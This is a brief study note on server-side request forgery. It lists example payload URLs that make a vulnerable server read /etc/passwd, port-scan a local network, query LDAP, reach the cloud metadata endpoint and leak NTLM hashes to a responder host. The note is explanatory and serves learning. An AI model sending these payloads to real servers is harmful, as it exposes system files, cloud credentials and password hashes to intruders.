---
tags:
  - security
  - web
aliases:
  - SSRF
---
A [[Forgery Attack]] in [[Web Security]] wherein an attacker forces a server to send requests, potentially leaking sensitive data.
- Leaks internal files `https://vuln.com/?fetch=file://etc/passwd`
- [[Port Scanner|Port Scanning]] other machines in [[Local Area Network|LAN]] `https://vuln.com/?fetch=http://192.168.0.3:21`
- Reaching internal services using protocols like [[Lightweight Directory Access Protocol|LDAP]], [[Secure File Transfer Protocol|SFTP]], [[Trivial File Transfer Protocol|TFTP]], [[Gopher Protocol]] `https://vuln.com/?fetch=ldap://192.168.0.4`
- Reaching cloud endpoints `https://vuln.com/?fetch=169.254.169.254/latest/meta-data` 
- Obtaining [[New Technology LAN Manager|NTLM]] hashes with [[responder]] `https://vuln.com/?fetch=http://responder.daniel.com`
# Techniques
- [[SSRF Localhost Bypass Technique]]